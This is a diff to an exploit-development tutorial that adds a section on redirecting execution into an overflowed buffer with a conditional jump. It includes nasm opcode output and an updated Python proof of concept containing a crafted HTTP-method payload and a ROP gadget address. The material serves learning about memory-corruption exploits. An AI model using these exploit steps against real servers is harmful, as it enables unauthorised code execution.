@@ -216,6 +216,38 @@ Because we made sure that EAX would contain a valid memory address, we should be
 
 ### 6. Conditional Jumps.<a name="ConditionalJumps"></a>
 
-Another way to place us in our buffer is Conditional Jumps.
+Another way to place us in our buffer is <a href=", http://faydoc.tripod.com/cpu/index_j.htm">Conditional Jumps.</a>
 
 Conditonal Jump execute a jump depending on specific conditions, if the condition is true, the condition is followed by a jump, if it false, it continue the execution without jumping.
+
+Here we will use the conditional jump "JE", it will execute a short jump and the condition for this jump is based on the value of the Zero Flag (ZF) register.
+
+The jump will be taken if the value of ZF register is set to 1 (TRUE).
+
+To use this conditional jump in our exploit, we need to be sure that the ZF register will always be true.
+
+Generate the opcodes for our Conditional Jump :
+```bash
+┌──(v0lk3n㉿Omen-Laptop)-[~]
+└─$ msf-nasm_shell
+nasm > xor ecx, ecx
+00000000  31C9              xor ecx,ecx
+nasm > test ecx, ecx
+00000000  85C9              test ecx,ecx
+nasm > je 0x17
+00000000  0F8411000000      jz near 0x17
+```
+
+We notice that there is no bad characters inside those opcodes excepted for the conditional jump opcodes which includes null bytes.
+
+As the memory allocation is zeroed out before the HTTP method is copied to it, we don't need to send the null bytes, send the first opcodes and use the existing null bytes to complete our instruction.
+
+Update the PoC:
+```python
+httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /" # xor ecx, ecx; test ecx, ecx; je 0x17  
+inputBuffer = b"\x41" * size  
+inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
+```
+
+Executing the PoC should place us directly at the beginning of our buffer where our instruction pointer, point to.
+
